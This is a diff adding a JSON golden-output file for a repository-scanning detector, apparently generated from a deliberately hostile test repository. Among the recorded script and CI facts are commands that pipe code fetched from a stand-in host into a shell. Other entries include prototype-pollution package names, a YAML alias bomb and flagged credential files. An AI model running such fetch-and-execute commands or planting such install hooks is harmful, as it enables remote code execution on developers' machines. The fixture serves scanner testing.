@@ -1,0 +1,3049 @@
+{
+  "categories": {
+    "access_signals": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_02caa44b6b1a02d075430057"
+          ],
+          "key": "file:.env",
+          "rule": "access.credential-file",
+          "state": "observed",
+          "value": {
+            "format": "env-file",
+            "kind": "credential_file",
+            "label": "Environment file",
+            "path": ".env"
+          }
+        },
+        {
+          "evidence": [
+            "ev_fff26b833f737eaa9015ea4f"
+          ],
+          "key": "file:.npmrc",
+          "rule": "access.credential-file",
+          "state": "observed",
+          "value": {
+            "format": "npmrc",
+            "kind": "credential_file",
+            "label": "npm configuration",
+            "path": ".npmrc"
+          }
+        },
+        {
+          "evidence": [
+            "ev_af93b6f81b22b1f303b607b8"
+          ],
+          "key": "zone:http://127.0.0.1:9",
+          "rule": "access.network-zone",
+          "state": "observed",
+          "value": {
+            "kind": "network_zone",
+            "origin": "http://127.0.0.1:9",
+            "zone": "loopback"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "access.search"
+        ],
+        "skipped": [
+          "src/deep.ts"
+        ],
+        "surface": [
+          "Dockerfile",
+          "babel.config.cjs",
+          "eslint.config.js",
+          "jest.config.mjs",
+          "packages/plugin/index.js",
+          "src/api.ts",
+          "src/deep.ts",
+          "src/index.ts",
+          "src/payload.cjs",
+          "src/payload.js",
+          "vite.config.ts",
+          "webpack.config.js"
+        ]
+      },
+      "state": "observed"
+    },
+    "api_contracts": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_1b5e64df587e332f23471647"
+          ],
+          "key": "openapi.yaml",
+          "rule": "contracts.openapi-document",
+          "state": "observed",
+          "value": {
+            "kind": "openapi",
+            "operations": 2,
+            "path": "openapi.yaml",
+            "servers": [
+              "http://trap.invalid"
+            ],
+            "title": "Trap",
+            "version": "3.1.0"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "contracts.search"
+        ],
+        "skipped": [
+          "src/deep.ts"
+        ],
+        "surface": [
+          "babel.config.cjs",
+          "eslint.config.js",
+          "jest.config.mjs",
+          "openapi.yaml",
+          "packages/plugin/index.js",
+          "src/api.ts",
+          "src/deep.ts",
+          "src/index.ts",
+          "src/payload.cjs",
+          "src/payload.js",
+          "vite.config.ts",
+          "webpack.config.js"
+        ]
+      },
+      "state": "observed"
+    },
+    "build_tools": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_5238045a09d9b510f4b72a54"
+          ],
+          "key": "babel",
+          "rule": "config.tool-file",
+          "state": "observed",
+          "value": {
+            "id": "babel",
+            "label": "Babel"
+          }
+        },
+        {
+          "evidence": [
+            "ev_17ea80b9b373a03a27282c09",
+            "ev_dd6f2d677a62f6b7e4cba6f2"
+          ],
+          "key": "vite",
+          "rule": "manifest.tool-dependency",
+          "state": "observed",
+          "value": {
+            "id": "vite",
+            "label": "Vite"
+          }
+        },
+        {
+          "evidence": [
+            "ev_7d178589e203cceb363dd2ca",
+            "ev_d662ea1cf09a2036e7ddba2f"
+          ],
+          "key": "webpack",
+          "rule": "manifest.tool-dependency",
+          "state": "observed",
+          "value": {
+            "id": "webpack",
+            "label": "webpack"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "config.tool-file",
+          "manifest.tool-dependency"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "ci_systems": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_7ca2dbfbe527876a82a9c27f"
+          ],
+          "key": ".github/workflows/ci.yml",
+          "rule": "ci.definition",
+          "state": "observed",
+          "value": {
+            "path": ".github/workflows/ci.yml",
+            "system": "github-actions"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "ci.definition"
+        ],
+        "skipped": [
+          ".github/workflows/bomb.yml"
+        ],
+        "surface": [
+          ".github/workflows/bomb.yml",
+          ".github/workflows/ci.yml"
+        ]
+      },
+      "state": "observed"
+    },
+    "composition": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_b91fa66f5f6fd86c50d370b4"
+          ],
+          "key": "import-map:__proto__",
+          "rule": "architecture.import-map",
+          "state": "observed",
+          "value": {
+            "mechanism": "import-map",
+            "source": "public/index.html",
+            "specifier": "__proto__",
+            "url": "http://trap.invalid/proto.js"
+          }
+        },
+        {
+          "evidence": [
+            "ev_b91fa66f5f6fd86c50d370b4"
+          ],
+          "key": "import-map:app",
+          "rule": "architecture.import-map",
+          "state": "observed",
+          "value": {
+            "mechanism": "import-map",
+            "source": "public/index.html",
+            "specifier": "app",
+            "url": "http://trap.invalid/app.js"
+          }
+        },
+        {
+          "evidence": [
+            "ev_92010aa9e9fb7e11e1f55225"
+          ],
+          "key": "module-federation:hostile",
+          "rule": "architecture.module-federation.webpack",
+          "state": "observed",
+          "value": {
+            "exposes": [],
+            "mechanism": "module-federation",
+            "name": {
+              "kind": "literal",
+              "value": "hostile"
+            },
+            "plugin": "architecture.module-federation.webpack",
+            "remotes": [
+              {
+                "alias": "trap",
+                "entry": {
+                  "kind": "literal",
+                  "value": "http://trap.invalid/remoteEntry.js"
+                },
+                "federation_name": "trap"
+              }
+            ],
+            "shared": []
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "architecture.import-map",
+          "composition"
+        ],
+        "skipped": [
+          "public/deep.importmap.json",
+          "src/deep.ts"
+        ],
+        "surface": [
+          "babel.config.cjs",
+          "eslint.config.js",
+          "jest.config.mjs",
+          "packages/plugin/index.js",
+          "public/index.html",
+          "src/api.ts",
+          "src/deep.ts",
+          "src/index.ts",
+          "src/payload.cjs",
+          "src/payload.js",
+          "vite.config.ts",
+          "webpack.config.js"
+        ]
+      },
+      "state": "observed"
+    },
+    "dependencies": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_9e54a96fc8dd3d1582d86e67"
+          ],
+          "key": "package.json#dependencies/__proto__",
+          "rule": "manifest.dependencies",
+          "state": "observed",
+          "value": {
+            "field": "dependencies",
+            "manifest": "package.json",
+            "name": "__proto__",
+            "specifier": "1.0.0"
+          }
+        },
+        {
+          "evidence": [
+            "ev_c0643b45aa1bb35b5aed2a4e"
+          ],
+          "key": "package.json#dependencies/constructor",
+          "rule": "manifest.dependencies",
+          "state": "observed",
+          "value": {
+            "field": "dependencies",
+            "manifest": "package.json",
+            "name": "constructor",
+            "specifier": "1.0.0"
+          }
+        },
+        {
+          "evidence": [
+            "ev_1c7b00099de69a359d3c4739"
+          ],
+          "key": "package.json#dependencies/trap-git",
+          "rule": "manifest.dependencies",
+          "state": "observed",
+          "value": {
+            "field": "dependencies",
+            "manifest": "package.json",
+            "name": "trap-git",
+            "specifier": "git+ssh://[redacted]@trap.invalid/trap.git"
+          }
+        },
+        {
+          "evidence": [
+            "ev_0ee341ad2c0e2296ad203cf3"
+          ],
+          "key": "package.json#dependencies/trap-tarball",
+          "rule": "manifest.dependencies",
+          "state": "observed",
+          "value": {
+            "field": "dependencies",
+            "manifest": "package.json",
+            "name": "trap-tarball",
+            "specifier": "http://trap.invalid/trap.tgz"
+          }
+        },
+        {
+          "evidence": [
+            "ev_64304a64d9d0e6b90b3a2311"
+          ],
+          "key": "package.json#devDependencies/vite",
+          "rule": "manifest.dependencies",
+          "state": "observed",
+          "value": {
+            "field": "devDependencies",
+            "manifest": "package.json",
+            "name": "vite",
+            "specifier": "6.2.0"
+          }
+        },
+        {
+          "evidence": [
+            "ev_315737c71193bcb84f883fe8"
+          ],
+          "key": "package.json#devDependencies/webpack",
+          "rule": "manifest.dependencies",
+          "state": "observed",
+          "value": {
+            "field": "devDependencies",
+            "manifest": "package.json",
+            "name": "webpack",
+            "specifier": "5.98.0"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "manifest.dependencies"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "egress_routes": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_a19d915b75bc5e5df633a64e"
+          ],
+          "key": "dev-proxy:vite.config.ts:/api",
+          "rule": "services.egress.vite-proxy",
+          "state": "observed",
+          "value": {
+            "configuration": "vite.config.ts",
+            "kind": "dev_proxy",
+            "route": "/api",
+            "target": {
+              "kind": "literal",
+              "value": "http://trap.invalid"
+            }
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "egress.search"
+        ],
+        "skipped": [
+          "src/deep.ts"
+        ],
+        "surface": [
+          "babel.config.cjs",
+          "eslint.config.js",
+          "jest.config.mjs",
+          "packages/plugin/index.js",
+          "src/api.ts",
+          "src/deep.ts",
+          "src/index.ts",
+          "src/payload.cjs",
+          "src/payload.js",
+          "vite.config.ts",
+          "webpack.config.js"
+        ]
+      },
+      "state": "observed"
+    },
+    "frameworks": {
+      "facts": [],
+      "search": {
+        "complete": true,
+        "rules": [
+          "manifest.framework"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "absent"
+    },
+    "languages": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_c70efe72f2ae970c3ffab13f"
+          ],
+          "key": "HTML",
+          "rule": "inventory.language-by-extension",
+          "state": "observed",
+          "value": {
+            "bytes": 304,
+            "files": 1
+          }
+        },
+        {
+          "evidence": [
+            "ev_057a474d26d0682c1a8ed0f4",
+            "ev_7711620a9f9a6cf86e790d43",
+            "ev_d5a0ea38550d0bc6b83f8742"
+          ],
+          "key": "JSON",
+          "rule": "inventory.language-by-extension",
+          "state": "observed",
+          "value": {
+            "bytes": 11708,
+            "files": 4
+          }
+        },
+        {
+          "evidence": [
+            "ev_3b1edcd83986d08bac7bd9d1",
+            "ev_9c90048e5c2098c97920b83a",
+            "ev_aa4c868a9ee39a2c9ed5e0c8"
+          ],
+          "key": "JavaScript",
+          "rule": "inventory.language-by-extension",
+          "state": "observed",
+          "value": {
+            "bytes": 1371,
+            "files": 7
+          }
+        },
+        {
+          "evidence": [
+            "ev_7dbaf3f9b1d48e68de578305"
+          ],
+          "key": "Shell",
+          "rule": "inventory.language-by-extension",
+          "state": "observed",
+          "value": {
+            "bytes": 110,
+            "files": 1
+          }
+        },
+        {
+          "evidence": [
+            "ev_4fba920d55c000c258616670",
+            "ev_62d4c89f6cff3fd1129bd660",
+            "ev_71b567dbf77aa5ca9502dfdd"
+          ],
+          "key": "TypeScript",
+          "rule": "inventory.language-by-extension",
+          "state": "observed",
+          "value": {
+            "bytes": 7513,
+            "files": 4
+          }
+        },
+        {
+          "evidence": [
+            "ev_5824518c735cace2f0800a33",
+            "ev_a63a9c45f9ab44a0d829f0f9",
+            "ev_d0f2f7bfaf9505ffdd8ebe4f"
+          ],
+          "key": "YAML",
+          "rule": "inventory.language-by-extension",
+          "state": "observed",
+          "value": {
+            "bytes": 764,
+            "files": 3
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "inventory.language-by-extension"
+        ],
+        "skipped": [],
+        "surface": []
+      },
+      "state": "observed"
+    },
+    "package_identity": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_66d9222d5dfa8fbc8f7c1ac1",
+            "ev_e9e7fcee8fb78f49623a3727"
+          ],
+          "key": "package.json",
+          "rule": "manifest.identity",
+          "state": "observed",
+          "value": {
+            "manifest": "package.json",
+            "name": "hostile-repository",
+            "private": true,
+            "version": "1.0.0"
+          }
+        },
+        {
+          "evidence": [
+            "ev_a8db2747a5693a8c433b52d8",
+            "ev_eddd52e959f798e54b7623d4"
+          ],
+          "key": "packages/plugin/package.json",
+          "rule": "manifest.identity",
+          "state": "observed",
+          "value": {
+            "manifest": "packages/plugin/package.json",
+            "name": "hostile-plugin",
+            "private": false,
+            "version": "0.0.1"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "manifest.identity"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "package_managers": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_4052b8c25217782314037549"
+          ],
+          "key": ".",
+          "reasoning": "package-lock.json is the lockfile npm writes, so npm manages this directory.",
+          "rule": "lockfile.package-manager",
+          "state": "inferred",
+          "value": "npm"
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "lockfile.package-manager",
+          "manifest.package-manager"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "inferred"
+    },
+    "packages_consumed": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_b5a4bd40150a7294cf4546f2"
+          ],
+          "key": "__proto__",
+          "rule": "packages.consumed",
+          "state": "observed",
+          "value": {
+            "internal": false,
+            "name": "__proto__"
+          }
+        },
+        {
+          "evidence": [
+            "ev_593dc0a6479bb283f95451be"
+          ],
+          "key": "constructor",
+          "rule": "packages.consumed",
+          "state": "observed",
+          "value": {
+            "internal": false,
+            "name": "constructor"
+          }
+        },
+        {
+          "evidence": [
+            "ev_20447843626860d971d6b488"
+          ],
+          "key": "trap-git",
+          "rule": "packages.consumed",
+          "state": "observed",
+          "value": {
+            "internal": false,
+            "name": "trap-git"
+          }
+        },
+        {
+          "evidence": [
+            "ev_708741572754875d64ccf54b"
+          ],
+          "key": "trap-tarball",
+          "rule": "packages.consumed",
+          "state": "observed",
+          "value": {
+            "internal": false,
+            "name": "trap-tarball"
+          }
+        },
+        {
+          "evidence": [
+            "ev_411b0a34b16a0aed3d925e52"
+          ],
+          "key": "vite",
+          "rule": "packages.consumed",
+          "state": "observed",
+          "value": {
+            "internal": false,
+            "name": "vite"
+          }
+        },
+        {
+          "evidence": [
+            "ev_18622435fc114c7cf2b30715"
+          ],
+          "key": "webpack",
+          "rule": "packages.consumed",
+          "state": "observed",
+          "value": {
+            "internal": false,
+            "name": "webpack"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "packages.consumed"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "packages_produced": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_14cf3b03a296a593e9e967bb",
+            "ev_87f34706bdaa99202001c574"
+          ],
+          "key": "hostile-plugin",
+          "rule": "packages.produced",
+          "state": "observed",
+          "value": {
+            "manifest": "packages/plugin/package.json",
+            "name": "hostile-plugin",
+            "published": true,
+            "version": "0.0.1"
+          }
+        },
+        {
+          "evidence": [
+            "ev_2293a793ed373b201fbf4fe6",
+            "ev_d654d631dfd7702578f163ae"
+          ],
+          "key": "hostile-repository",
+          "rule": "packages.produced",
+          "state": "observed",
+          "value": {
+            "manifest": "package.json",
+            "name": "hostile-repository",
+            "published": false,
+            "version": "1.0.0"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "packages.produced"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "resolved_dependencies": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_a4427c1cd44e42fcc199d06c"
+          ],
+          "key": "package.json#__proto__",
+          "rule": "npm-lock.resolved-version",
+          "state": "observed",
+          "value": {
+            "manifest": "package.json",
+            "name": "__proto__",
+            "version": "1.0.0"
+          }
+        },
+        {
+          "evidence": [
+            "ev_d8c197b1cefde04ca19144e7"
+          ],
+          "key": "package.json#constructor",
+          "rule": "npm-lock.resolved-version",
+          "state": "observed",
+          "value": {
+            "manifest": "package.json",
+            "name": "constructor",
+            "version": "1.0.0"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "npm-lock.resolved-version",
+          "pnpm-lock.resolved-version",
+          "yarn-lock.resolved-version"
+        ],
+        "skipped": [],
+        "surface": [
+          "package-lock.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "runtime_integrations": {
+      "facts": [],
+      "search": {
+        "complete": true,
+        "rules": [
+          "composition"
+        ],
+        "skipped": [
+          "src/deep.ts"
+        ],
+        "surface": [
+          "babel.config.cjs",
+          "eslint.config.js",
+          "jest.config.mjs",
+          "packages/plugin/index.js",
+          "src/api.ts",
+          "src/deep.ts",
+          "src/index.ts",
+          "src/payload.cjs",
+          "src/payload.js",
+          "vite.config.ts",
+          "webpack.config.js"
+        ]
+      },
+      "state": "unknown"
+    },
+    "runtime_requirements": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_97b2710e8d2276a400489bff"
+          ],
+          "key": "node",
+          "rule": "runtime.dockerfile",
+          "state": "observed",
+          "value": {
+            "declared": [
+              "24-alpine"
+            ],
+            "range": ">=24.0.0 <25.0.0-0"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "runtime.declarations"
+        ],
+        "skipped": [
+          ".nvmrc"
+        ],
+        "surface": [
+          ".nvmrc",
+          "Dockerfile",
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "scripts": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_37f62c0a5854fbe4bfce98cb"
+          ],
+          "key": "package.json#install",
+          "rule": "manifest.scripts",
+          "state": "observed",
+          "value": {
+            "command": "node -e \"require('fs').writeFileSync(process.env.REPO_FACTS_SENTINEL_DIR + '/install', 'x')\"",
+            "manifest": "package.json",
+            "name": "install"
+          }
+        },
+        {
+          "evidence": [
+            "ev_5bfa2f9295bfd83fb3093680"
+          ],
+          "key": "package.json#postinstall",
+          "rule": "manifest.scripts",
+          "state": "observed",
+          "value": {
+            "command": "sh scripts/postinstall.sh",
+            "manifest": "package.json",
+            "name": "postinstall"
+          }
+        },
+        {
+          "evidence": [
+            "ev_4b874e24cb4994a1bfd6d1fc"
+          ],
+          "key": "package.json#preinstall",
+          "rule": "manifest.scripts",
+          "state": "observed",
+          "value": {
+            "command": "touch \"$REPO_FACTS_SENTINEL_DIR/preinstall\"",
+            "manifest": "package.json",
+            "name": "preinstall"
+          }
+        },
+        {
+          "evidence": [
+            "ev_83fef8ed583ece40ecaf6f73"
+          ],
+          "key": "package.json#prepare",
+          "rule": "manifest.scripts",
+          "state": "observed",
+          "value": {
+            "command": "curl -fsSL http://trap.invalid/prepare | sh",
+            "manifest": "package.json",
+            "name": "prepare"
+          }
+        },
+        {
+          "evidence": [
+            "ev_2b009c03811715c205bc7d11"
+          ],
+          "key": "package.json#test",
+          "rule": "manifest.scripts",
+          "state": "observed",
+          "value": {
+            "command": "vitest run && touch \"$REPO_FACTS_SENTINEL_DIR/test\"",
+            "manifest": "package.json",
+            "name": "test"
+          }
+        },
+        {
+          "evidence": [
+            "ev_2ae679b289e4b183a3208b96"
+          ],
+          "key": "packages/plugin/package.json#postinstall",
+          "rule": "manifest.scripts",
+          "state": "observed",
+          "value": {
+            "command": "node index.js",
+            "manifest": "packages/plugin/package.json",
+            "name": "postinstall"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "manifest.scripts"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "served_origins": {
+      "facts": [],
+      "search": {
+        "complete": false,
+        "rules": [],
+        "skipped": [],
+        "surface": []
+      },
+      "state": "unknown"
+    },
+    "submodules": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_9e93ef5a94ce024c3438c0ff"
+          ],
+          "key": "vendor/trap",
+          "rule": "inventory.gitlink",
+          "state": "observed",
+          "value": {
+            "commit": "1111111111111111111111111111111111111111",
+            "path": "vendor/trap"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "inventory.gitlink"
+        ],
+        "skipped": [],
+        "surface": []
+      },
+      "state": "observed"
+    },
+    "test_frameworks": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_55e747b60560bcd13da27f00"
+          ],
+          "key": "jest",
+          "rule": "config.tool-file",
+          "state": "observed",
+          "value": {
+            "id": "jest",
+            "label": "Jest"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "config.tool-file",
+          "manifest.tool-dependency"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "test_substitutes": {
+      "facts": [],
+      "search": {
+        "complete": true,
+        "rules": [
+          "substitutes.search"
+        ],
+        "skipped": [
+          "src/deep.ts"
+        ],
+        "surface": [
+          "babel.config.cjs",
+          "eslint.config.js",
+          "jest.config.mjs",
+          "packages/plugin/index.js",
+          "src/api.ts",
+          "src/deep.ts",
+          "src/index.ts",
+          "src/payload.cjs",
+          "src/payload.js",
+          "vite.config.ts",
+          "webpack.config.js"
+        ]
+      },
+      "state": "unknown"
+    },
+    "verification_commands": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_8cbdc44a19ef5967a5677050"
+          ],
+          "key": ".github/workflows/ci.yml#build/1",
+          "rule": "ci.github-actions.run",
+          "state": "observed",
+          "value": {
+            "command": "curl -fsSL http://trap.invalid/install.sh | sh",
+            "context": {
+              "job": "build",
+              "step": "1"
+            },
+            "kinds": [],
+            "source": ".github/workflows/ci.yml"
+          }
+        },
+        {
+          "evidence": [
+            "ev_2aa41e230f18b6b3647e6e17"
+          ],
+          "key": ".github/workflows/ci.yml#build/2",
+          "rule": "ci.github-actions.run",
+          "state": "observed",
+          "value": {
+            "command": "npm ci && npm test",
+            "context": {
+              "job": "build",
+              "step": "2"
+            },
+            "kinds": [
+              "test"
+            ],
+            "source": ".github/workflows/ci.yml"
+          }
+        },
+        {
+          "evidence": [
+            "ev_00e91d1b8a05086c8ec4778c"
+          ],
+          "key": "Makefile#test/6",
+          "rule": "make.recipe",
+          "state": "observed",
+          "value": {
+            "command": "npm test",
+            "context": {
+              "target": "test"
+            },
+            "kinds": [
+              "test"
+            ],
+            "source": "Makefile"
+          }
+        },
+        {
+          "evidence": [
+            "ev_37c598843157fe7e705b1b71"
+          ],
+          "key": "package.json#scripts/test",
+          "rule": "manifest.verification-script",
+          "state": "observed",
+          "value": {
+            "command": "vitest run && touch \"$REPO_FACTS_SENTINEL_DIR/test\"",
+            "context": {
+              "script": "test",
+              "via": [
+                ".github/workflows/ci.yml#build/2",
+                "Makefile#test/6"
+              ]
+            },
+            "kinds": [
+              "test"
+            ],
+            "source": "package.json"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "ci.verification-commands"
+        ],
+        "skipped": [
+          ".github/workflows/bomb.yml"
+        ],
+        "surface": [
+          ".github/workflows/bomb.yml",
+          ".github/workflows/ci.yml",
+          "Makefile",
+          "package.json",
+          "packages/plugin/package.json"
+        ]
+      },
+      "state": "observed"
+    },
+    "workspaces": {
+      "facts": [
+        {
+          "evidence": [
+            "ev_5406d1396a4a28a66498f9ed",
+            "ev_c57852bdb41966a95eddc1a2"
+          ],
+          "key": "packages/plugin",
+          "rule": "manifest.workspaces",
+          "state": "observed",
+          "value": {
+            "directory": "packages/plugin",
+            "package": "hostile-plugin"
+          }
+        }
+      ],
+      "search": {
+        "complete": true,
+        "rules": [
+          "manifest.workspaces",
+          "pnpm-workspace.packages"
+        ],
+        "skipped": [],
+        "surface": [
+          "package.json"
+        ]
+      },
+      "state": "observed"
+    }
+  },
+  "commit": null,
+  "detector_release": "golden",
+  "diagnostics": [
+    {
+      "detail": "Invalid YAML: Excessive alias count indicates a resource exhaustion attack",
+      "detector": "ci",
+      "path": ".github/workflows/bomb.yml",
+      "reason": "parse_failed"
+    },
+    {
+      "detail": "\"lts/*\" is not a version range for node",
+      "detector": "runtime",
+      "path": ".nvmrc",
+      "reason": "unsupported_runtime_declaration"
+    },
+    {
+      "detail": "package.json declares 4 dependencies this lockfile does not lock: trap-git, trap-tarball, vite, webpack",
+      "detector": "npm-lock",
+      "path": "package-lock.json",
+      "reason": "unlocked_dependency"
+    },
+    {
+      "detail": "The document nests deeper than 100 levels",
+      "detector": "composition",
+      "path": "public/deep.importmap.json",
+      "reason": "parse_failed"
+    },
+    {
+      "detail": "The file nests too deeply to parse",
+      "detector": "syntax",
+      "path": "src/deep.ts",
+      "reason": "syntax_depth_limit"
+    }
+  ],
+  "evidence": {
+    "ev_00e91d1b8a05086c8ec4778c": {
+      "commit": null,
+      "content_digest": "bd84b946be35a9dc26d38be9ae242612278cff4509f02606a8bb28a7659e9fd3",
+      "detector": "ci",
+      "excerpt_digest": "ca5c777a90b44a3f23a1fa16db5dcfc4c0a8772c5d638fb185317ad1b93fdce7",
+      "id": "ev_00e91d1b8a05086c8ec4778c",
+      "location": {
+        "end": 6,
+        "kind": "lines",
+        "start": 6
+      },
+      "object_id": "1ffe4047f11362fbeeac58b806b2782c3cff9c4b",
+      "path": "Makefile",
+      "rule": "make.recipe"
+    },
+    "ev_02caa44b6b1a02d075430057": {
+      "commit": null,
+      "content_digest": "ec877f210c6bf438b0930a16a5713c32409f301c0123f9c0c11b83d3757c2786",
+      "detector": "service-signals",
+      "excerpt_digest": "ec877f210c6bf438b0930a16a5713c32409f301c0123f9c0c11b83d3757c2786",
+      "id": "ev_02caa44b6b1a02d075430057",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "ff6a81973c112f90ee44270f435e6ed705316073",
+      "path": ".env",
+      "rule": "access.credential-file"
+    },
+    "ev_057a474d26d0682c1a8ed0f4": {
+      "commit": null,
+      "content_digest": "50b2c133d918750ccaaa010552c093bf716921dbfc7713c49395d8feba4cbb72",
+      "detector": "inventory",
+      "excerpt_digest": "50b2c133d918750ccaaa010552c093bf716921dbfc7713c49395d8feba4cbb72",
+      "id": "ev_057a474d26d0682c1a8ed0f4",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_0ee341ad2c0e2296ad203cf3": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "9f01ff3a672b51bdc93faab1c05e7e1a9c18d3218ea1b125b78d4fcf70615324",
+      "id": "ev_0ee341ad2c0e2296ad203cf3",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/trap-tarball"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.dependencies"
+    },
+    "ev_12ece8d4b4918ff6f3338591": {
+      "commit": null,
+      "content_digest": "675404338f3df13a16ac6ef76abfd52310cf50c24f07634bf5cf454b02413c65",
+      "detector": "service-dependencies",
+      "excerpt_digest": "19fbdd750ca9e3b9dacf768aa0e5bd74351862923ade6909ab1e621f9e3676dc",
+      "id": "ev_12ece8d4b4918ff6f3338591",
+      "location": {
+        "end": 7,
+        "kind": "lines",
+        "start": 7
+      },
+      "object_id": "defa51622cb49c4e11f703dcfccb09df864a5399",
+      "path": "src/api.ts",
+      "rule": "services.fetch"
+    },
+    "ev_14cf3b03a296a593e9e967bb": {
+      "commit": null,
+      "content_digest": "f109013b0f83e23db4ec3a1f6bb07bb4908669e843adeb04b0738ca6c7a6486b",
+      "detector": "package-relations",
+      "excerpt_digest": "7ed4f9e88471ae810035b1e57e57df328e7c24840f98915b63c4b345ce5e2e9f",
+      "id": "ev_14cf3b03a296a593e9e967bb",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/version"
+      },
+      "object_id": "2d5c76a68983f5d34bead14e6e1df8e5752873c5",
+      "path": "packages/plugin/package.json",
+      "rule": "packages.produced"
+    },
+    "ev_17ea80b9b373a03a27282c09": {
+      "commit": null,
+      "content_digest": "bfd0a70031d6b5439c0155188732e77dfa42ee46b276af130a8b0e84b029b5e9",
+      "detector": "tooling",
+      "excerpt_digest": "bfd0a70031d6b5439c0155188732e77dfa42ee46b276af130a8b0e84b029b5e9",
+      "id": "ev_17ea80b9b373a03a27282c09",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "8802a0053322f9aa85f12ae94b8a15fe6f29fa4c",
+      "path": "vite.config.ts",
+      "rule": "config.tool-file"
+    },
+    "ev_18622435fc114c7cf2b30715": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "99c451e8ce9769e37432246dd7b21e71d7be55af8c1e797213f1ffe2f7cfd917",
+      "id": "ev_18622435fc114c7cf2b30715",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/devDependencies/webpack"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.consumed"
+    },
+    "ev_1b5e64df587e332f23471647": {
+      "commit": null,
+      "content_digest": "f1cf071a1d6b1cdb2763e3282f1d3da092dd4c82073896222a30876fb9642d32",
+      "detector": "service-signals",
+      "excerpt_digest": "536c8d78e8a0acbef96c0881c0b313c1dc7090176417df5982b2c7c82423ca16",
+      "id": "ev_1b5e64df587e332f23471647",
+      "location": {
+        "format": "yaml",
+        "kind": "pointer",
+        "pointer": "/openapi"
+      },
+      "object_id": "75bed2fd66e38c35113faf4a6550e6f9d37e1300",
+      "path": "openapi.yaml",
+      "rule": "contracts.openapi-document"
+    },
+    "ev_1c7b00099de69a359d3c4739": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "f5abb50710e274f5239ada97903b13013577bf9101810cbd3efe4afc626dc464",
